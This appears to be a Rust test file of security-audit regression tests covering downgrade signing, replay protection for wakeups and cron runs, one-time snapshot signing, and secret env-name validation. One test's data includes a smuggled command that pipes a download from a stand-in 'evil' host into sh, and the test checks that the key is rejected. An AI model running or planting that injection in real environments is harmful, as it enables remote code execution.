//! r1_test.go: the audit's R1 findings on the machine side (2026-10-11): each test attempts the forbidden thing.

use super::snapstream::snap_router;
use super::testutil::*;
use super::vouch::signed_request;
use crate::deliver::*;
use crate::snapshot::{FROZEN, SNAPSHOT_PATHS, not_frozen};
use crate::snapstream::upload_snapshot;
use crate::supervisor::TEST_FREEZE;
use serde_json::json;
use std::collections::HashMap;
use std::sync::atomic::Ordering;

/// Finding: the machine signed the core's downgrade challenge without checking its store list, so the router could
/// keep the stores the session asked to drop.
#[test]
fn a_downgrade_signs_only_the_stores_asked_for() {
    let (core, enc, sig) = (new_key(), new_key(), new_key());
    let m = json!({"id": "m1", "encryptionKey": enc.public(), "signingKey": sig.public()});
    let ch = |stores: &[&str]| {
        core.doc(&json!({"kind": "challenge", "request": {"downgrade": true, "stores": stores, "machine": m}}))
    };
    let keep = vec!["default".to_string()];
    let check = |d| {
        crate::downgrade::check_downgrade_challenge(
            &core.public(),
            Some(&d),
            "m1",
            &enc.public(),
            &sig.public(),
            &keep,
        )
    };
    assert!(
        check(ch(&["default", "prod"])).is_err(),
        "signed a downgrade that keeps a store the session dropped"
    );
    check(ch(&["default"])).unwrap();
    let cert =
        core.doc(&json!({"kind": "succession-cert", "stores": ["default", "prod"], "machine": m}));
    assert!(
        crate::downgrade::check_downgrade_cert(
            &core.public(),
            Some(&cert),
            "m1",
            &enc.public(),
            &sig.public(),
            &keep
        )
        .is_err(),
        "took a new cert that still names a dropped store"
    );
}

/// Finding: a router-written store could put a key like `X=1;curl …|sh;Y` into the env the secrets reach.
#[test]
fn secrets_take_only_env_names() {
    let e = TestEnv::new();
    let held = &crate::secrets::HELD;
    held.set(HashMap::from(
        [
            ("GOOD", "it's"),
            ("X=1;curl -s https://evil/x|sh;Y", "v"),
            ("1BAD", "v"),
            ("a b", "v"),
        ]
        .map(|(k, v)| (k.to_string(), v.to_string())),
    ));
    let got = held.snapshot();
    held.set(HashMap::new());
    assert!(got.len() == 1 && got["GOOD"] == "it's", "held {got:?}");
    assert!(!e.home.join(".secrets").exists(), "~/.secrets written");
}

fn wakeup(k: &Tkey, body: &str) -> Delivery {
    Delivery {
        kind: "wakeup".into(),
        request: Some(signed_request(
            k,
            "m1",
            "POST",
            "/m/api/sessions/s/wakeup",
            body.as_bytes(),
        )),
        ..Default::default()
    }
}

fn cron(k: &Tkey, body: &str) -> Delivery {
    Delivery {
        kind: "cron".into(),
        run: 1,
        request: Some(signed_request(
            k,
            "m1",
            "POST",
            "/m/api/sessions/s/crons",
            body.as_bytes(),
        )),
        ..Default::default()
    }
}

const NOW: i64 = 1791700000;

/// Finding: the router could replay a session's signed one-time wakeup (or a cron run) as often as it liked.
#[test]
fn a_wakeup_is_delivered_once_and_a_cron_once_per_run() {
    let _e = TestEnv::new();
    let k = new_key();
    let w = wakeup(&k, r#"{"prompt":"release"}"#);
    not_replayed(&w, NOW).unwrap();
    assert!(
        not_replayed(&w, NOW + 3600).is_err(),
        "a one-time wakeup was delivered twice"
    );
    let mut cr = cron(&k, r#"{"prompt":"p","everySeconds":3600}"#);
    not_replayed(&cr, NOW).unwrap();
    // the router reads this exact wording as "the session already has run 1" and counts it (router/schedule.go
    // sessionHasRun): change both together
    let r = not_replayed(&cr, NOW + 7200);
    assert!(
        r.as_ref()
            .is_err_and(|e| format!("{e:#}") == "cron run 1 was already delivered (last 1)"),
        "a cron run was delivered twice: {r:?}"
    );
    cr.run = 2;
    let r = not_replayed(&cr, NOW + 600);
    assert!(
        r.as_ref().is_err_and(|e| format!("{e:#}").contains("half")),
        "a cron ran far faster than its period: {r:?}"
    );
    not_replayed(&cr, NOW + 3600).unwrap();
    // the record travels in the snapshot, so a successor refuses the same repeats
    assert!(
        SNAPSHOT_PATHS.contains(&DELIVERED_FILE),
        "the delivered record isn't in the snapshot"
    );
}

/// Finding: the router could keep an early signed snapshot and kill with it later (a rollback). The machine signs one
/// snapshot in its life, after stopping the session, and answers every later snapshot command with that one.
#[test]
fn the_machine_signs_one_final_snapshot() {
    let e = TestEnv::new();
    let key = e.machine_key();
    *TEST_FREEZE.lock().unwrap() = Some((0, 0));
    let (srv, fr) = snap_router(&key);
    let c = srv.client();
    std::fs::create_dir_all(e.home.join("workspace")).unwrap();
    std::fs::write(e.home.join("workspace/a"), "one").unwrap();
    upload_snapshot(&c).unwrap();
    let froze = TEST_FREEZE.lock().unwrap().unwrap().0;
    assert!(
        froze == 1 && FROZEN.load(Ordering::SeqCst),
        "the session wasn't stopped before its snapshot"
    );
    // work after it (if anything still ran) never reaches a second signed snapshot
    std::fs::write(e.home.join("workspace/a"), "two").unwrap();
    upload_snapshot(&c).unwrap();
    let commits = fr.lock().unwrap().commits.clone();
    let froze = TEST_FREEZE.lock().unwrap().unwrap().0;
    assert!(
        commits.len() == 2 && commits[0] == commits[1] && froze == 1,
        "a second, different snapshot was signed: {commits:?} (froze {froze})"
    );
    // and nothing is delivered or run into a stopped session
    assert!(not_frozen().is_err(), "a stopped session takes input");
}

/// 2026-10-15 (the legacy + move rehearsal): a wakeup that resumes a paused session reaches a harness still booting
/// ("target session not found"); the router tries again, and the retry must still deliver. deliver checks before the
/// harness and records only after it took the text.
#[test]
fn a_wakeup_the_harness_refused_is_not_burned() {
    let _e = TestEnv::new();
    let w = wakeup(&new_key(), r#"{"prompt":"later"}"#);
    replay_guard(&w, NOW, false).unwrap();
    replay_guard(&w, NOW + 5, false).expect("a wakeup the harness refused counts as delivered");
    replay_guard(&w, NOW + 5, true).unwrap();
    assert!(
        replay_guard(&w, NOW + 60, false).is_err(),
        "a delivered wakeup passes the check again"
    );
}

/// 2026-11-17: schedule-wakeup.sh armed every cron with a fractional period ("everySeconds":1800.0, Python's float).
/// Decoding that into an int64 failed, the guard fell back to a day, and every run after the first was refused as
/// "less than half its period ago" (12 h): recurring wakeups ran once and then only failed.
#[test]
fn a_cron_armed_with_a_fractional_period_runs_again() {
    let _e = TestEnv::new();
    let mut cr = cron(&new_key(), r#"{"prompt":"p","everySeconds":1800.0}"#);
    not_replayed(&cr, NOW).unwrap();
    cr.run = 2;
    not_replayed(&cr, NOW + 1800)
        .expect("run 2 of a 30-minute cron, 30 minutes later, was refused");
    cr.run = 3;
    assert!(
        not_replayed(&cr, NOW + 2400).is_err(),
        "a 30-minute cron ran 10 minutes after its last run"
    );
}
